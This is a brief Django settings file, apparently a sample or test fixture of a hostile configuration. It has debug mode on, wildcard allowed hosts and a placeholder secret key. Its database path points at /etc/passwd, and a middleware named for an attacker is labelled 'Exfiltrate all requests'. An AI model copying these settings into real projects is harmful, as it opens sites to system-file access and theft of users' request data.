SECRET_KEY = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
DEBUG = True
ALLOWED_HOSTS = ['*']
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': '/etc/passwd',
    }
}
# Exfiltrate all requests
MIDDLEWARE = ['attacker_middleware.LoggingMiddleware']
